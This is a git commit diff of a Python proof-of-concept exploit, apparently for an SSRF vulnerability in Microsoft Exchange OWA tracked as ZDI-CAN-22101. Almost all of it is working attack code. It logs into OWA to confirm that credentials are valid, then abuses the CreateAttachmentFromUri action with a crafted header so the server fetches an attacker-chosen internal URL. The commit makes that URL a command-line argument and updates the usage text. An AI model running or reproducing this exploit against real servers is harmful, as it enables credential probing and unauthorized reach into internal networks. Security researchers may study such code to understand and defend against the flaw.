310a5ad092b44be88a8d0e2f1ea060f3636a53f4
Yiuwai Je <3077576585@qq.com>
2023-11-14 10:46:01 +0800

    Update ZDI-CAN-22101.py

--- ZDI-CAN-22101.py
+++ ZDI-CAN-22101.py
@@ -1,6 +1,6 @@
-# @Time    : 2023/11/6
+# @Time    : 2023/11/14
 # @Author  : jeyiuwai
-# @File    : ssrf.py
+# @File    : ZDI-CAN-22101.py
 
 import requests
 import sys
@@ -50,7 +50,7 @@ warnings.filterwarnings("ignore")
 #     except Exception as e:
 #         print(e)
 
-def ssrf2(url, username, password):
+def ssrf2(url, username, password,internal_url):
     # owa
     url1 = 'https://' + url + '/owa/auth.owa'
     headers = {
@@ -62,8 +62,8 @@ def ssrf2(url, username, password):
 
     r = session.post(url1, headers=headers, data=payload, verify=False)
     if 'X-OWA-CANARY' in r.cookies:
-        print(r.headers)
-        print("[+] Valid:%s  %s" % (username, password))
+        # print(r.headers)
+        print("[+] Account Valid:%s  %s" % (username, password))
     else:
         print("[!] Login error")
     r.close()
@@ -76,30 +76,35 @@ def ssrf2(url, username, password):
         "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
         "X-Requested-With": "XMLHttpRequest",
         'Action': 'CreateAttachmentFromUri',
-        "X-Owa-Urlpostdata": '{"__type": "CreateAttachmentFromUriRequestWrapper:#Exchange", "isInline": "false", "itemId": {"__type": "ItemId:#Exchange", "ChangeKey": "poc", "Id": "poc"}, "name": "pocname.txt", "subscriptionId": "1", "uri": "http://127.0.0.1:8080"}'
+        "X-Owa-Urlpostdata": '{"__type": "CreateAttachmentFromUriRequestWrapper:#Exchange", "isInline": "false", "itemId": {"__type": "ItemId:#Exchange", "ChangeKey": "poc", "Id": "poc"}, "name": "pocname.txt", "subscriptionId": "1", "uri": "%s"}' % (internal_url)
     }
+
+    # print(headers2)
 
     payload2 = ''
 
     try:
+        print('[+] Start to exploit')
         response2 = session.post(url2, headers=headers2, json=payload2, verify=False)
-        print(response2.status_code)
-        print(response2.text)
+        print('[+] Exploit end')
+        # 无响应回显
+        # print(response2.status_code)
+        # print('Response text is:' + response2.text)
     except Exception as e:
         print(e)
 
 
 if __name__ == '__main__':
-    if len(sys.argv) != 4:
+    if len(sys.argv) != 5:
         print('[!] Wrong parameter')
-        print('checkOWA')
-        print('Use to check the valid account of Exchange by connecting to OWA.')
-        print('Author:3gstudent')
+        print('SSRF ZDI-CAN-22101')
+        print('Use to check the valid account of Exchange by connecting to OWA.And exploit the SSRF vulnerability to get internal url.')
+        print('Author:jeyiuwai')
         print('Usage:')
-        print('%s <url> <user> <password>' % (sys.argv[0]))
+        print('%s <url> <user> <password> <internal_url>' % (sys.argv[0]))
         print('Eg.')
-        print('%s 192.168.1.1 user1 password1' % (sys.argv[0]))
+        print('%s 192.168.1.1 user1 password1 http://127.0.0.1:8080' % (sys.argv[0]))
         sys.exit(0)
     else:
-        # get(sys.argv[1], sys.argv[2], sys.argv[3])
-        ssrf2(sys.argv[1], sys.argv[2], sys.argv[3])
+        # print(sys.argv[1] +'\n' + sys.argv[2] + '\n' + sys.argv[3] + '\n' + sys.argv[4])
+        ssrf2(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
